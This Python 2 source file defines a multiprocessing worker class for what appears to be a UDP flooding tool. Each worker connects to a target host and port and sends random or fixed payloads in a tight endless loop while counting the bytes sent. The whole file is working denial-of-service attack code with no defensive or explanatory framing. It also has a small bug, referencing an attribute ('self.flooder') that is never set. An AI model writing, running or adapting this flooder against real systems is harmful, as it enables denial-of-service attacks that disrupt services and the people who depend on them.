import socket, time
from Functions import *
from multiprocessing import Process

class UDPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        self.host = flooder.host
        self.port = flooder.port
        self.wait = flooder.wait
        self.running = True
        self.byteCount = flooder.byteCount
        self.tempBytes = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

        print "initialized udp thread"

    def stop(self):
        self.running = False

    def run(self):
        try:
            try:
	            self.socket.connect((self.host, self.port))
	            #print "thread", self.id, "connected"
            except Exception as e:
	            #print "Couldn't connect:", e.args, self.host, self.port
	            return

            i = 0
            while self.running:
                try:
                    bytes = self.socket.send(self.message)
                    self.tempBytes += bytes
                    if self.wait:
                        time.sleep(0.01)
                    i += 1
                    if i % 10 == 0:
                        self.byteCount.value += self.tempBytes
                        self.tempBytes = 0
                except Exception as e:
                    #print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return

    def __getstate__(self):
        odict = self.__dict__.copy()
        del odict['socket']
        return odict

    def __setstate__(self, dict):
        self.__dict__.update(dict)
        self.socket = socket.socket()
        self.socket.setblocking(1)
